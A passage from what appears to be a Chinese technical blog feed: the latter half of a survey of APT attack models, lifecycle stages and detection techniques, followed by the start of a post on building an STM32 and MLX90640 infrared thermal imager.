然后逐步展开描述攻击者如何实现目标。</p><p>攻击树及其子树的根节点代表攻击目标,叶节点代表攻击手法。节点可以根据目标赋予代价、成功概率等属性,研究人员可据此检测路径中的脆弱点。攻击树模型适合于描述多阶段的网络攻击行为,攻击目标由一系列子目标通过“AND/OR”关系复合而成。下图为一个攻击树模型示例,其中G表示攻击目标, E表示攻击手法, M表示攻击的中间步骤。</p><figure><img src="/img/高级持续性威胁与检测技术简述/攻击树模型.png"alt="攻击树模型" /><figcaption aria-hidden="true">攻击树模型</figcaption></figure><h4 id="attck模型">2.3.4 ATT&amp;CK模型</h4><p>ATT&amp;CK（Adversarial Tactics, Techniques, and CommonKnowledge）模型是由MITRE公司于2013年提出的一种威胁情报框架,用于描述攻击者的战术、技术和常见知识。ATT&amp;CK模型包含多个矩阵,每个矩阵描述了不同类型的攻击手法。攻击者可以随意切换策略和技术以实现最终目标。ATT&amp;CK模型在安全领域广受欢迎,可以用于攻击发现与分析、威胁情报、攻击模拟和评估等。</p><p>策略(Tactics)、技术(Techniques)、组织(Groups)和软件(Software)是ATT&amp;CK模型中的四个关键对象,它们之间的关系如下图。策略是攻击者行动的目标, 如初始入侵、横向移动;技术是实现策略时需要采取的行动, 如漏洞扫描、暴力破解;组织介绍了知名黑客组织, 包括基本描述、攻击事件等;软件是攻击者常用的工具。</p><figure><img src="/img/高级持续性威胁与检测技术简述/ATT&amp;CK模型.png"alt="ATT&amp;CK模型" /><figcaption aria-hidden="true">ATT&amp;CK模型</figcaption></figure><p>ATT&amp;CK模型的优点是灵活适应不同场景, 可根据实际情况进行定制。然而,ATT&amp;CK模型依赖于人工更新, 需要不断更新以适应新的攻击手法和威胁。</p><h3 id="apt攻击的生命周期">2.4 APT攻击的生命周期</h3><p>一次APT攻击从确定攻击目标起,需要通过多种手段、利用诸多资源才能成功地达到最终目的。将APT攻击建模为由多个阶段组成的链式模型有助于研究人员分析理解APT攻击。</p><figure><img src="/img/高级持续性威胁与检测技术简述/生命周期.jpg"alt="生命周期" /><figcaption aria-hidden="true">生命周期</figcaption></figure><p>本文基于杀伤链模型，将APT攻击划分为6个阶段,分别为侦察准备、外部渗透、命令与控制、横向移动、数据泄露和撤退。从防御者的角度,对APT攻击阶段重新划分, 细化了易于检测的阶段, 合并了难以检测的阶段,提出了针对检测防御的攻击模型。</p><h4 id="侦察情报收集">2.4.1 侦察：情报收集</h4><p>APT攻击通常以侦察为起点。攻击者在锁定目标后，会展开全面侦察，为后续入侵铺平道路。这一阶段通常持续数周甚至数月，主要手段包括网络扫描和社会工程信息收集。</p><p>在侦察过程中，攻击者通过扫描获取目标网络和主机的相关信息，或者从社交媒体、公开数据库等渠道收集目标的基础信息。这些信息可能涵盖个人资料（如职业、兴趣、家庭等）、设备细节（如系统版本、开放端口、已知漏洞等）以及组织架构。此外，攻击者还可能运用社会工程技巧，对目标组织成员进行心理操控，以获取更多敏感数据。</p><p>完成信息收集后，攻击者会制定攻击计划，并根据目标特点定制攻击工具。这些工具通常包括木马程序、已知漏洞和零日漏洞。</p><p>在APT攻击中，已公开的漏洞是最常见的攻击手段。由于用户安全意识不足和软件更新不及时，攻击者能够轻易利用这些漏洞入侵系统。零日漏洞虽然是APT攻击的“王牌武器”，但其挖掘难度大、成本高，且时效性极强，因而使用相对较少。</p><h4 id="初始攻击apt攻击的渗透阶段">2.4.2初始攻击：APT攻击的渗透阶段</h4><p>在完成侦察并制定详细计划后，APT攻击进入初始攻击阶段，这一阶段的核心目标是通过隐蔽而精准的手段成功渗透目标系统并建立初始立足点。攻击者通常会利用鱼叉式钓鱼邮件作为主要手段，通过伪装成可信内容，诱导目标点击恶意链接或打开携带恶意代码的附件，从而在目标系统中植入木马程序或远程访问工具（RAT）。攻击者也可能通过漏洞利用直接发起攻击，特别是利用侦察阶段发现的系统或软件漏洞，通过恶意网站或文件实现渗透。</p><p>在某些情况下，供应链攻击成为一种更加隐蔽的方式，攻击者渗透目标依赖的第三方供应商，将恶意代码嵌入合法的软件更新包或硬件设备中，从而感染目标系统。水坑攻击则是一种间接的渗透手段，攻击者在目标组织成员频繁访问的网站中植入恶意代码，等待目标访问后自动感染其设备。除了技术手段外，攻击者也可能通过社会工程和物理方式，如利用恶意USB设备或假冒技术支持人员，直接对目标系统进行渗透。</p><p>完成初始攻击后，攻击者成功在目标系统中建立立足点，为接下来的权限提升、横向移动和数据窃取做好准备。初始攻击阶段的高度隐蔽性使其难以被防御方及时发现，从而为APT攻击后续行动奠定了基础。</p><h4 id="权限提升从初始立足到完全控制">2.4.3权限提升：从初始立足到完全控制</h4><p>权限提升阶段的核心目标是利用初始访问权限逐步获取更高的系统权限，从而对目标系统实现更深层次的控制，为后续的横向移动、数据窃取和持久驻留提供支持。</p><p>在这一阶段，攻击者通常利用多种技术手段来提升权限。其中，最常见的是利用目标系统中存在的本地漏洞或弱点，通过提权工具、代码执行漏洞或配置错误获取管理员权限。例如，攻击者可能利用未打补丁的系统漏洞，通过内核提权攻击将普通用户权限提升到系统管理员权限。此外，凭据窃取也是常用手段，攻击者通过内存抓取工具（如Mimikatz）提取存储在内存中的明文密码、哈希值或安全令牌，进而模拟合法用户身份，绕过权限验证。</p><p>在某些复杂的环境中，攻击者也可能通过“传递哈希”或“黄金票据”技术，直接获取对域控制器的完全控制权。同时，利用信任关系的滥用也是一种策略，攻击者通过伪造或劫持数字证书、篡改组策略对象（GPO）等方式，扩大其权限范围并隐藏行动痕迹。</p><p>在权限提升的过程中，攻击者通常会采取高度隐蔽的策略，通过删除日志、伪装进程或使用无文件攻击等手段，尽可能规避安全监测系统的发现。一旦权限提升成功，攻击者能够对目标系统的关键资源实施更广泛的操作，包括访问敏感数据、篡改系统配置以及安装后门以确保持久性。</p><p>权限提升阶段不仅是攻击者迈向完全控制的重要环节，也是防御方检测APT攻击的重要窗口。如果能够在此阶段发现异常行为并采取应对措施，便可有效阻止攻击者进一步行动，降低攻击影响。</p><h4 id="横向移动从立足点扩展到全网控制">2.4.4横向移动：从立足点扩展到全网控制</h4><p>在成功获得高权限后，APT攻击进入横向移动阶段，其核心目标是以已掌控的初始立足点为基础，逐步扩展控制范围，渗透到目标网络的更多系统和资源，从而全面掌握关键数据和环境信息。</p><p>攻击者通常会首先对网络进行扫描和分析，以绘制出完整的网络拓扑图，了解主机、服务、用户和资源之间的关系。他们可能借助工具如Nmap、BloodHound或自定义脚本，探测网络架构、域信任关系以及共享资源的分布情况。在明确目标后，攻击者会通过已窃取的高权限凭据或认证令牌，利用协议如RDP、SMB、SSH等，逐步访问并控制其他主机。</p><p>凭据重用攻击是横向移动中最常见的手段之一。通过利用已获取的管理员账户密码，攻击者可以轻松攻陷使用相同凭据的其他设备。传递哈希技术也常被使用，尤其是在域环境中，攻击者通过直接认证哈希值而非密码，绕过了许多安全防护机制。</p><p>在更加复杂的网络中，攻击者可能结合漏洞利用和信任关系滥用，进一步突破网络的隔离。例如，他们可能针对文件服务器、数据库或域控制器发起攻击，从而控制关键节点。与此同时，社会工程手段仍可能发挥作用，诱骗其他用户泄露敏感信息或执行恶意操作，为进一步扩展权限创造条件。</p><p>为了避免被检测，攻击者通常会伪装自己的活动。他们可能使用代理工具或加密隧道隐藏数据流量，或将恶意进程伪装成合法服务，以绕过安全系统的检测。攻击者还会清理或修改日志记录，掩盖横向移动的轨迹，进一步增强行动的隐蔽性。</p><p>完成横向移动后，攻击者通常已掌握整个网络的关键系统和资源，为最终的数据窃取、破坏或进一步的恶意活动打下坚实基础。由于这一阶段涉及广泛的网络活动，它既是攻击者全面渗透的关键环节，也是安全团队通过异常行为分析和权限使用监控发现威胁的最佳时机。</p><h4 id="数据窃取与持久化目标达成与长期控制">2.4.5数据窃取与持久化：目标达成与长期控制</h4><p>这一阶段的重点是对目标敏感信息进行系统化的搜集和转移，同时确保攻击者能够长期保持对目标系统的控制权，以便随时发起进一步的行动。</p><p>攻击者通常会对目标环境中的敏感数据进行深度挖掘，包括商业机密、个人隐私、知识产权、财务记录和政府文件等。在完成搜集后，他们会利用加密和压缩工具对数据进行预处理，以减小传输体积并规避安全监测。随后，通过安全的通信渠道（如加密的C2服务器、隐蔽隧道或云服务）将数据转移到攻击者的控制范围之外。</p><p>在数据窃取过程中，攻击者会采取各种手段隐藏其行为。例如，他们可能会将数据分批次、小规模地传输，以伪装成正常的网络流量。同时，通过伪造合法用户身份、修改日志记录或利用“无文件攻击”方式，攻击者能够有效规避入侵检测系统和流量监控工具。</p><p>同时，为了确保长期访问目标系统，攻击者会进行持久化操作。其常见手段包括：</p><ul><li>植入后门：在系统中隐藏恶意程序，使其能够绕过安全更新和权限检查。<br /></li><li>修改启动项：利用计划任务、服务或注册表键值，确保恶意代码在系统重启后仍能执行。<br /></li><li>伪装合法工具：将恶意程序包装为常用软件或服务，以避免引起注意。<br /></li><li>利用供应链：攻击者可能会在受害者依赖的第三方系统或软件中植入恶意代码，以便在必要时重新进入目标网络。</li></ul><p>有时攻击者还会建立多个隐藏访问点，确保即使部分后门被清除，他们仍然能够通过其他途径重新控制系统。持久化不仅增强了攻击的隐蔽性，还为未来可能的多次利用奠定了基础。</p><p>数据窃取与持久化阶段标志着APT攻击的最终目标逐步实现，而攻击者对目标系统的持续控制也成为防御方面临的长期威胁。如果无法及时识别和清除攻击者留下的隐患，网络环境可能长期处于威胁之中，对信息安全构成严重风险。</p><h4 id="逃逸与清理">2.4.6 逃逸与清理</h4><p>攻击者进入系统时，以及进入后实施的操作都会在系统中留下痕迹，如被记录在日志中。为了不被发现和不被成功溯源，攻击者需要了解他的操作会留下哪些痕迹，并在执行攻击过程中和完成攻击后，尽可能删除所有犯罪痕迹，然后退出系统。攻击者会清除系统日志、删除痕迹文件、销毁恶意软件和后门工具，或对修改过的文件进行恢复，以掩盖其活动的轨迹。他们还可能修改或删除网络流量日志和系统事件日志，抹去任何可能暴露攻击过程的线索。</p><p>此外，攻击者会使用反取证技术来消除或混淆痕迹。例如，他们可能使用加密技术对其通信进行加密，确保数据传输过程中不会被第三方捕获或分析。攻击者还会针对可能暴露他们的恶意进程或服务，采取隐藏进程、伪装或注入等手段，避免反病毒软件和入侵检测系统检测到恶意活动。</p><p>清理工作完成后，攻击者通常会撤离目标系统，退出网络，确保他们的行动不再被检测。然而，尽管攻击者表面上“撤离”，他们可能会通过设立隐蔽的反向连接，随时准备再次入侵，尤其是在攻击者未完全达到目标时。</p><p>逃逸与清理阶段是APT攻击中的最后一道防线，标志着攻击者从目标系统中撤离，确保未被追踪和发现。如果防御方能够在这一阶段进行有效的反击并发现攻击的痕迹，便有可能追溯到攻击者的整个攻击链，及时封堵后门并强化网络安全防御。</p><h3 id="apt攻击检测载体">2.5 APT攻击检测载体</h3><p>APT攻击会在系统中留下痕迹, 现有研究方法利用不同信息载体检测APT攻击,常用的数据有包括网络流量、恶意文件、日志和外部信息。</p><ul><li><p>网络流量<br />APT攻击往往伴随着异常的网络流量，尤其是数据传输、远程连接、与外部C2服务器的通信等行为。通过分析网络流量，可以发现攻击者与目标之间的隐蔽通讯，尤其是在攻击者进行数据窃取或控制命令传输时，常常会有明显的流量异常，如不寻常的端口、协议或加密通信模式。</p></li><li><p>恶意文件<br />APT攻击的许多工具和恶意软件通常会在目标系统中留下文件痕迹。这些恶意文件可以是植入的木马、后门、键盘记录器、勒索软件等。通过文件行为分析和反病毒技术，可以检测到这些恶意文件的存在。例如，异常的可执行文件、修改的系统文件或隐藏在正常应用程序中的恶意代码，都是潜在的攻击线索。</p></li><li><p>日志<br />日志是系统和应用程序在运行过程中生成的重要记录，APT攻击往往会在日志中留下可疑的活动痕迹。攻击者可能会利用合法的账户发起攻击，或在系统中隐藏恶意活动，因此通过分析系统日志、应用日志、网络设备日志等，可以发现异常登录、权限提升、远程访问等异常行为。这种分析不仅有助于早期发现攻击，还能帮助追溯攻击过程和源头。</p></li><li><p>外部信息<br />攻击者的活动不仅限于目标网络内部，很多时候，外部信息也是APT攻击的重要线索。分析公共数据源（如社交媒体、新闻报道、公司公告等）可以发现攻击者的社交工程攻击痕迹。针对目标的特定威胁情报和网络攻击报告，也可以帮助识别和阻止已知APT攻击模式的发生。</p></li></ul><h2 id="apt检测技术">3. APT检测技术</h2><p>APT攻击具有高度隐蔽性和持续性，传统的安全防御手段往往难以有效防范。为了应对APT攻击，研究人员提出了多种检测技术，包括行为分析、威胁情报、机器学习与深度学习、数据挖掘等。这些技术在不同层面和角度上对APT攻击进行检测和分析，为防御者提供了多种选择。</p><h3 id="行为分析">3.1 行为分析</h3><p>行为分析是一种基于行为特征的检测技术，通过分析系统和网络中的异常行为，识别潜在的APT攻击。行为分析技术主要包括主机行为分析和网络行为分析两种。</p><h4 id="主机行为分析">3.1.1 主机行为分析</h4><p>主机行为分析通过监控目标系统（如服务器、工作站等）的内部活动，捕捉异常的行为模式。这种方法关注主机上程序和用户的行为，通过对系统资源、文件操作、进程启动、网络连接等活动的分析，识别潜在的异常行为。主机行为分析可以检测到未授权的文件访问、恶意程序的执行、系统设置的更改、可疑的权限提升操作等。这种分析可以帮助识别攻击者在主机内的活动，如使用恶意代码进行数据窃取、篡改日志、植入后门等行为。</p><p>主机行为分析的优势在于，它可以深入到系统内部，识别出即使是经过隐蔽操作的恶意活动，具有较高的检测精度。然而，这也需要大量的数据处理和计算资源，并且对于复杂的攻击链，可能需要多次触发才能准确识别。</p><h4 id="网络行为分析">3.1.2 网络行为分析</h4><p>网络行为分析是一种基于网络流量的检测技术，通过监控网络中的数据包、连接和通信模式，识别潜在的APT攻击。其侧重于通过监控和分析网络流量，检测异常的网络活动和通信模式。APT攻击中的许多活动，如数据窃取、命令与控制（C2）通信、横向移动等，都会产生特殊的网络行为。通过分析网络流量、协议使用情况、IP通信、端口访问等，网络行为分析能够发现攻击者与目标之间的异常流量模式。例如，攻击者可能会通过加密隧道、低频次的隐蔽流量等方式与外部C2服务器进行通信，或通过不常见的端口和协议发送数据。网络行为分析可以帮助识别这些异常的流量模式，从而及时发现攻击活动。</p><p>网络行为分析的优势在于可以对整个网络进行实时监控，并且能在较大范围内检测到攻击活动。然而，它对流量的分析能力依赖于网络设备的部署，且在某些加密或隐蔽通信手段下，可能存在一定的检测难度。</p><p>由于APT攻击常常是多阶段的、复杂的，结合主机行为分析和网络行为分析可以提供更全面的安全保障，增强对APT攻击的防御能力。</p><h3 id="威胁情报">3.2 威胁情报</h3><p>基于威胁情报的APT检测是一种通过分析和利用外部和内部威胁情报来识别和防范APT攻击的方法。APT攻击通常具有高度定制性和隐蔽性，因此，传统的基于签名的检测方法可能难以有效识别新型或变种的攻击。基于威胁情报的APT检测依赖于对已知攻击模式、攻击者工具、技术、程序（TTPs，Tactics,Techniques, andProcedures）的深刻理解，通过共享和集成威胁情报，帮助及时识别潜在的APT攻击。</p><figure><img src="/img/高级持续性威胁与检测技术简述/whois.png" alt="whois" /><figcaption aria-hidden="true">whois</figcaption></figure><p>威胁情报主要包括外部威胁情报和内部威胁情报两种。外部威胁情报是指来自第三方的关于已知攻击者、攻击组织、攻击工具、攻击技术等信息，如公开的威胁情报平台、安全厂商的威胁报告、黑客论坛的信息等。内部威胁情报是指来自内部网络和系统的关于异常行为、安全事件、日志记录等信息，如IDS/IPS、防火墙、终端安全软件等设备的报警信息。通过整合外部和内部威胁情报，可以帮助防御者更好地了解攻击者的行为模式、攻击手法和攻击目标，从而提高对APT攻击的检测和防范能力。</p><p>威胁情报的优势在于可以帮助防御者及时了解最新的攻击趋势和攻击手法，提前发现潜在的APT攻击。通过分析威胁情报，防御者可以识别攻击者的行为模式、攻击工具和攻击目标，从而制定相应的防御策略和安全措施。然而，威胁情报的有效性和准确性取决于信息的来源和质量，需要防御者具备一定的分析能力和判断力。</p><p>威胁情报的应用范围广泛，可以用于APT攻击的检测、威胁情报共享、攻击模拟和演练等多个方面。通过及时获取和分析威胁情报，防御者可以更好地了解攻击者的行为模式和攻击手法，提高对APT攻击的检测和防范能力。</p><h3 id="机器学习与深度学习">3.3 机器学习与深度学习</h3><p>机器学习和深度学习是基于数据驱动的APT攻击检测技术，它们通过训练模型从大量数据中自动学习特征，发现潜在的攻击模式，并进行预测。与传统的基于规则或签名的检测方法不同，机器学习和深度学习能够处理复杂、动态的数据，并在攻击模式尚未明确时提供检测能力。</p><p>机器学习通过算法从大量数据中自动学习并构建模型，能够识别数据中的潜在规律。它可以通过特征提取和模式识别，分析网络流量、主机日志和行为日志等数据源，帮助识别和预测攻击者的行为，通过监督学习算法对数据进行分类，判断某一行为是否为APT攻击，或预测攻击的潜在威胁级别。同时，基于无监督学习的异常检测技术可以发现与正常模式不同的行为，将其标记为异常并进一步验证是否为攻击。机器学习的优势在于模型的自适应性，能够根据新的攻击数据进行自我更新，增强系统对新型攻击的检测能力。随着训练数据的增加、模型的不断优化和计算资源的提升，机器学习有望在未来成为APT攻击检测的核心技术之一。</p><h2 id="挑战与展望">4. 挑战与展望</h2><p>经过十余年的发展，APT攻击的技术手段愈发复杂和隐蔽，这使得检测和防御工作面临巨大的挑战。攻击者采用多样化的技术，包括零日漏洞利用、社会工程学、持久化后门等方式，不仅增加了攻击成功的可能性，还显著提高了检测难度。与此同时，各种面向APT攻击的检测技术不断涌现，并试图与日益成熟的APT攻击手段进行持续博弈。然而，从整体上看，APT检测研究仍处于起步阶段，当前的技术手段在实际应用中存在明显的局限性。</p><p>现有APT检测技术的局限性主要表现在以下几个方面。首先，检测方法依赖于大量高质量的数据，例如网络流量、日志信息、文件特征等，而APT攻击往往通过分布式、低频的行为隐藏在海量正常数据中，极大地增加了检测的复杂性。其次，APT攻击具有高度定制化的特性，不同的攻击场景和目标需要不同的检测策略，这对检测技术的灵活性和适应能力提出了更高要求。此外，现有检测技术在面对零日漏洞或未知攻击模式时，往往显得力不从心，容易产生误报或漏报，影响检测的实用性和准确性。最后，APT检测的实时性和资源消耗之间的矛盾也是需要解决的问题。特别是深度学习等技术虽然具有较强的检测能力，但通常需要高计算资源支持，这对实时检测和大规模部署提出了挑战。</p><p>尽管困难重重，APT检测技术的未来发展前景仍然值得期待。随着人工智能、大数据分析、威胁情报等领域的不断进步，APT检测技术有望突破当前的瓶颈。例如，利用强化学习等新兴方法，可以进一步提高检测模型的适应性和通用性，从而更好地应对定制化和多样化的攻击。此外，结合基于行为分析和威胁情报的检测方法，可以实现对APT攻击全生命周期的监控与识别，有效提升检测的覆盖面和精准度。</p><p>未来，APT检测技术的发展需要在多方面取得突破，包括建立标准化的数据集和评测体系，以提高模型训练和测试的可靠性；优化算法和模型结构，以平衡检测效率与资源消耗；加强跨学科合作，将多领域的最新成果引入APT检测研究中。同时，在技术研发的过程中，行业与政府应积极合作，共同推动APT检测生态系统的构建，从而在更大范围内实现对APT攻击的有效防御。APT检测研究虽仍在起步阶段，但通过技术创新与多方协作，有望在日益激烈的攻防博弈中占据主动地位。</p><h2 id="结论">5. 结论</h2><p>高级持续性威胁（APT）以其隐蔽性、复杂性和高针对性，成为当今信息安全领域最严峻的挑战之一。APT攻击者通常是具备专业技术和丰富资源的组织，他们通过多种攻击手段实现对目标系统的长期控制。近年来频繁发生的APT攻击事件不仅给政府、企业等关键领域带来了严重的经济和信息安全损失，也充分暴露了传统安全防护技术在应对高级威胁时的不足。</p><p>传统的基于规则的检测技术，如防火墙、入侵检测系统和反病毒软件，主要依赖已知的攻击特征和行为模式，难以应对未知的APT攻击。为此，学术界和工业界逐渐探索并开发出更为先进的APT检测方法，包括行为分析、威胁情报和基于机器学习的技术。这些技术不仅可以发现隐藏的攻击行为，还能动态适应新的威胁模式。然而，APT检测技术的实施仍面临诸多挑战，包括高维数据处理、实时性要求以及对误报率的严格限制。</p><p>本文简述了APT的核心概念、特点和典型攻击模型，并系统分析了现有的检测技术及其局限性。在当前技术的基础上，我们认为未来的APT检测应注重以下方向：首先，融合多源威胁情报，构建更全面的检测模型；其次，结合深度学习与解释性技术，提高检测模型的透明度和可操作性；最后，加强人机协作，将自动化检测与专家判断有机结合，进一步提升APT检测的准确性与效率。</p><p>随着APT攻击形式的不断演变，APT检测技术的研究需要更加注重动态性、前瞻性和实践性。通过持续改进和优化，我们相信APT检测技术将在保障信息系统安全、维护数字经济发展方面发挥更为关键的作用。</p>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>APT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于MLX90640的红外热成像仪</title>
    <link href="/2024/12/29/%E5%9F%BA%E4%BA%8EMLX90640%E7%9A%84%E7%BA%A2%E5%A4%96%E7%83%AD%E6%88%90%E5%83%8F%E4%BB%AA/"/>
    <url>/2024/12/29/%E5%9F%BA%E4%BA%8EMLX90640%E7%9A%84%E7%BA%A2%E5%A4%96%E7%83%AD%E6%88%90%E5%83%8F%E4%BB%AA/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="基于mlx90640的红外热成像仪">基于MLX90640的红外热成像仪</h1><h2 id="引言">1. 引言</h2><p>红外热成像技术近年来在工业检测、医疗诊断、消防救援和自动化领域得到了广泛应用。作为一种非接触式温度测量和图像生成技术，红外热成像仪能够实时捕获物体表面的温度分布，并以可视化的形式直观呈现。这种特性使其在环境复杂、温度变化敏感的场景中具有不可替代的优势。</p><p>MLX90640是一款高性能的红外热成像传感器，采用 32×24的像素阵列，能够在较大的视场角下提供精确的热图数据。相比于传统的单点红外温度传感器，MLX90640具有数据量大、分辨率适中和体积小巧的优点，非常适合便携式热成像设备的开发，同时，MLX90640更加经济且易于集成，适合便携式设备开发以及资源受限场景下的应用。</p><p>本项目以STM32F407微控制器为核心，结合MLX90640红外热成像传感器和 LVGL图形库，设计并实现了一款便携式红外热成像仪，为红外热成像仪的低成本开发提供了一种可行的实现路径。同时以舵机为例展示了本项目的可扩展性，也为进一步的功能扩展，如添加数据存储、无线传输或AI温度分析等功能提供了技术基础。下面我们将以实验平台与模块介绍、硬件连接、技术要求、系统架构、软件设计、实验效果和结论七个方面阐述基于MLX90640的红外成像仪设计与实现。最后，我们将给出在设计过程中所涉及到的开源资料以及本项目的开源代码和资料。</p><h2 id="实验平台与模块介绍">2. 实验平台与模块介绍</h2><p>本实验以MLX90640红外热成像传感器为核心，结合STM32F407微控制器和LVGL图形界面库，实现实时红外热成像的采集、处理与显示。实验平台主要由以下模块构成：</p><h3 id="核心处理单元stm32f407">2.1 核心处理单元：STM32F407</h3><p>STM32F407 是基于 ARM Cortex-M4 内核的微控制器，具有以下特点：</p><ul><li>主频高达 168 MHz，支持复杂计算和高速数据处理。<br /></li><li>1MB Flash 和 192KB RAM，适合大规模数据存储和处理。<br /></li><li>提供丰富的外设接口（I2C、SPI、UART 等），便于与 MLX90640和显示设备通信。<br /></li><li>具有 DMA 控制器和浮点运算单元，适合处理 MLX90640输出的大量数据。</li></ul><h3 id="红外传感模块mlx90640">2.2 红外传感模块：MLX90640</h3><p>MLX90640是一款高分辨率的红外热成像传感器，适用于远距离非接触温度测量，主要特性如下：</p><ul><li>分辨率：32 × 24 像素，覆盖视场角为 55°× 35° 或 110°× 75°。<br /></li><li>测量范围：-40°C 至 300°C，精度 ±1°C（典型）。<br /></li><li>输出数据帧率高达 64 Hz，支持实时热成像。<br /></li><li>通过 I2C 接口与主控芯片通信，传输红外图像数据。</li></ul><figure><img src="/img/基于MLX90640的红外热成像仪/MLX90640.png"alt="MLX90640" /><figcaption aria-hidden="true">MLX90640</figcaption></figure><h3 id="图形界面lvgl">2.3 图形界面：LVGL</h3><p>LVGL（Light and Versatile GraphicsLibrary）是一个开源的嵌入式图形界面库，用于开发低资源占用的用户界面：<br />- 提供丰富的 UI 控件，支持多种交互方式（触摸、按键等）。<br />- 具有高效的内存管理和动画功能，适合嵌入式显示设备。<br />- 可运行在 STM32F407 上，与 TFT LCD显示屏结合，实现热成像的实时图形化显示。</p><figure><img src="/img/基于MLX90640的红外热成像仪/LVGL.png" alt="LVGL" /><figcaption aria-hidden="true">LVGL</figcaption></figure><h3 id="显示屏与外设模块">2.4 显示屏与外设模块</h3><ul><li>TFT LCD屏幕：用于显示热成像图和温度信息。使用4.3英寸的屏幕，分辨率为800 x480，支持SPI通信。<br /></li><li>触摸屏模块：用于调整显示设置、温度信息。<br /></li><li>舵机模块：选用SG90舵机，3.3V供电，用于模拟瞄准操作，范围为0-90度，工作扭矩2KG。<br /></li><li>电源模块：提供稳定的3.3V和5V电压，用于驱动 STM32 和 MLX90640。</li></ul><figure><img src="/img/基于MLX90640的红外热成像仪/SG90.png" alt="SG90" /><figcaption aria-hidden="true">SG90</figcaption></figure><h2 id="硬件连接">3. 硬件连接</h2><ul><li>STM32F407和LCD显示屏: 通过 SPI 或并口连接，使用 DMA提高传输效率。<br /></li><li>MLX90640和STM32F407: 通过串口连接，I2C驱动已集成至传感器中。<br /></li><li>SG90和STM32F407: 使用PWM驱动，改变频率以改变角度。<br /></li><li>电源供电: 使用电源模块为 STM32 和 MLX90640 提供稳定的电压。</li></ul><h2 id="技术要求">4. 技术要求</h2><h3 id="传感器数据处理">4.1 传感器数据处理</h3><ul><li>数据采集:实现MLX90640的I2C通信、实现串口通信，获取原始红外数据。<br /></li><li>温度解码: 根据传感器数据格式，计算对应的温度值矩阵。<br /></li><li>数据统计: 根据温度数据，绘制直方图，计算平均温度、方差等数据。</li></ul><h3 id="界面开发">4.2 界面开发</h3><ul><li>基于LVGL的用户界面<ul><li>显示实时热成像图。<br /></li><li>显示最高温和最低温数值，并标记。<br /></li><li>绘制温度直方图。<br /></li><li>绘制最高温度点。<br /></li></ul></li><li>交互功能: 通过触摸屏切换模式和显示参数。</li></ul><h2 id="系统架构">5. 系统架构</h2><h3 id="硬件架构">5.1 硬件架构</h3><figure><img src="/img/基于MLX90640的红外热成像仪/硬件架构.png"alt="硬件架构" /><figcaption aria-hidden="true">硬件架构</figcaption></figure><ul><li>STM32F407: 作为核心处理单元，负责数据采集、处理和显示。<br /></li><li>MLX90640: 作为红外热成像传感器，负责采集红外热成像数据。<br /></li><li>TFT LCD: 用于显示热成像图和温度信息。<br /></li><li>触摸屏: 用于调整显示设置、温度信息。<br /></li><li>SG90: 用于模拟瞄准操作，将最高温度点对准中心。<br /></li><li>电源模块: 为 STM32 和 MLX90640 提供稳定的电压。</li></ul><h3 id="软件架构">5.2 软件架构</h3><figure><img src="/img/基于MLX90640的红外热成像仪/软件架构.png"alt="软件架构" /><figcaption aria-hidden="true">软件架构</figcaption></figure><ul><li>LVGL: 用于绘制用户界面，显示热成像图、温度信息和直方图。<br /></li><li>数据采集与处理: 通过串口接收 MLX90640输出的原始温度数据帧，解析数据并生成温度矩阵。<br /></li><li>数据处理与显示: 将温度矩阵映射为热图像素数据，通过LVGL绘制热图到TFTLCD上，显示温度统计信息、直方图、舵机瞄准示意图等UI。<br /></li><li>舵机驱动:根据最高温度点的坐标映射为舵机角度，设置定时任务，驱动舵机瞄准。</li></ul><h3 id="运行流程">5.3 运行流程</h3><h4 id="数据采集流程">5.3.1 数据采集流程</h4><ol type="1"><li>STM32 初始化UART5串口，与 MLX90640 建立通信。</li><li>采集 MLX90640 输出的原始温度数据帧。</li><li>校准和处理数据，生成温度矩阵。</li></ol><h4 id="数据处理与显示流程">5.3.2 数据处理与显示流程</h4><ol type="1"><li>温度矩阵经过映射生成热图像素数据。</li><li>使用双缓冲机制，通过LVGL将热图绘制到TFT LCD上。</li><li>绘制温度统计信息、直方图、舵机瞄准示意图等UI。</li><li>根据用户输入调整显示参数。</li></ol><h4 id="舵机驱动流程">5.3.3 舵机驱动流程</h4><ol type="1"><li>等待温度数据接收完毕，生成温度矩阵。</li><li>将坐标映射为舵机角度。</li><li>设置定时任务，驱动舵机瞄准。</li></ol><h2 id="软件设计">6. 软件设计</h2><h3 id="数据采集与处理">6.1 数据采集与处理</h3><h4 id="数据采集">6.1.1 数据采集</h4><p>使用STM32F407的UART5模块与MLX90640进行通信，通过I2C协议获取红外热成像数据。</p><p>通信协议：<br />串口：</p><ol type="1"><li>串口通信参数(默认波特率 115200，数据位 8，停止位 1，无校验)</li></ol><ul><li>波特率 9600，数据位 8，停止位 1，无校验。<br /></li><li>波特率 115200，数据位 8，停止位 1，无校验。<br /></li><li>波特率 460800，数据位 8，停止位 1，无校验。</li></ul><ol start="2" type="1"><li>数据帧格式</li></ol><ul><li>数据帧长度 1544 字节，包括 1536 字节的温度数据。<br /></li><li>数据帧格式：<ul><li>帧头 2 字节：0x5A 0x5A。<br /></li><li>数据量 2 字节：数据量低 8 位，数据量高 8 位。<br /></li><li>温度数据 1536 字节：32 × 24 像素，每个像素 2 字节，低位在前。<br /></li><li>自身温度 2 字节：低位在前。<br /></li><li>帧尾 2 字节：校验和，低位在前。</li></ul></li></ul><p>字节代表含义：</p><ul><li>byte0~1: 帧头<br /></li><li>byte2~3: 该帧数据量=byte3 * 256 + byte2<br /></li><li>byte4~1539<br />温度点阵，目标物体768个点的温度，每两个字节为一个温度，该温度是实际温度的100倍；<br />例如：点 1 的温度 = (byte5 * 256 + byte4) / 100<br />点 768 的温度 = (byte1539 * 256 + byte1538) / 100<br /></li><li>byte1540~1541<br />MLX90640 自身温度的100 倍。也可当作环境温度。<br />TA = (byte1541 * 256 + byte1540) / 100<br /></li><li>byte1542~1543: 帧尾，前771个字的累加和，保留16bit。</li></ul><p>在STM32F407中，通过UART5接收数据，然后解析数据帧，提取温度数据，于是在串口中断中进行数据处理。<br /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 